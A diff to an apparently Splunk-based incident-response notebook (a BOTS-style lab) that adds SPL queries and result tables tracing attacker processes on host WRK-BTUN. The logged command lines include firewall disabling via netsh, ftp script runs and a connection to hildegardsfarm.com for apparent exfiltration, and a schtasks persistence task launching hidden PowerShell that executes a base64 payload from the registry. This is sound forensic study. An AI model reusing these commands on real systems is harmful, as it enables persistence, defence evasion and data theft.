@@ -43,6 +43,7 @@ Type 3 is a limited token with administrative privileges removed and administrat
 
 
 
+
 ## index="botsv*" "10.0.2.107"
 ### index="botsv*" "10.0.2.107" | stats count by src_ip,dest_ip
 
@@ -57,6 +58,24 @@ Type 3 is a limited token with administrative privileges removed and administrat
 | 0x1174             | 1     |
 | 0x8c0              | 1     |
 | 0xed8              | 1     |
+
+### index="botsv*" EventCode IN (4648,4688) AND WRK-BTUN AND parent_process_id IN (0xe80,0x1370) | stats count by _time,parent_process_id,process_id,process_command_line_process,process_command_line_arguments
+| _time       | parent_process_id | process_id | process_command_line_process | process_command_line_arguments | count |
+| - | - | - | - | - | - |
+| 2017/08/24 12:31:59 | 0x1370 | 0x5e8 | "C:\Windows\system32\whoami.exe" | /groups | 1 |
+| 2017/08/24 12:32:00 | 0x1370 | 0x112c | "C:\Windows\system32\whoami.exe" | /groups | 1 |
+| 2017/08/24 12:33:29 | 0xe80 | 0x1168 | "C:\Windows\system32\netsh.exe"  | advfirewall set allprofiles state off | 1 |
+| 2017/08/24 12:36:49 | 0xe80 | 0x11bc | "C:\Windows\system32\ftp.exe" | -i -s:winsys32.dll | 1|
+| 2017/08/24 12:39:09 | 0xe80  | 0x123c | "C:\Windows\system32\whoami.exe" | /user | 1 |
+| 2017/08/24 12:45:03 | 0xe80  | 0xd20 | "C:\Windows\system32\schtasks.exe" | /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"" | 1 |
+| 2017/08/24 12:46:35 | 0xe80 | 0x1108 | "C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe" | /noconfig /fullpaths @"C:\Users\billy.tun\AppData\Local\Temp\_lvk8kdj.cmdline" | 1 |
+| 2017/08/24 12:52:13 | 0xe80 | 0x850 | "C:\Windows\system32\net.exe" | share | 1 |
+| 2017/08/26 14:42:06 | 0xe80 | 0x160c | "C:\Windows\system32\ftp.exe" | -i -s:winsys64.dll | 1 |
+| 2017/08/26 15:13:34 | 0xe80 | 0xeac | "C:\Windows\system32\ftp.exe" | -i -s:winsys64.dll | 1 |
+| 2017/08/26 15:43:37 | 0xe80 | 0xe08 | "C:\Windows\system32\ftp.exe" | open hildegardsfarm.com | 1 |
+| 2017/08/26 15:46:08 | 0xe80 | 0x148c | "C:\Windows\system32\ftp.exe" | -i -s:singlefile.dll | 1 |
+
+
 
 ### index="botsv*" WRK-BTUN AND EventCode IN (4648,4688) AND parent_process_id IN (0xed8, 0x8c0, 0x1174) | stats count by _time,parent_process_id,process_id,process_command_line_process,process_command_line_arguments
 | _time | parent_process_id | process_id | process_command_line_process | process_command_line_arguments  | count |
@@ -73,6 +92,7 @@ Type 3 is a limited token with administrative privileges removed and administrat
 ```
 
 ### index="botsv*" EventCode IN (4648,4688) AND WRK-BTUN AND process_id IN (0xed8, 0x8c0, 0x1174) | stats count by parent_process_id
+こいつら親プロセスはシステム系のプロセスぽいので、攻撃者のプロセスはないかんじ？
 | parent_process_id | count |
 |-------------------|-------|
 | 0x1370            | 1     |
@@ -82,6 +102,8 @@ Type 3 is a limited token with administrative privileges removed and administrat
 | 0x6ac             | 1     |
 | 0xe50             | 35    |
 | 0xed8             | 1     |
+
+
 
 
 ##  index="botsv*" sourcetype="stream:ftp"
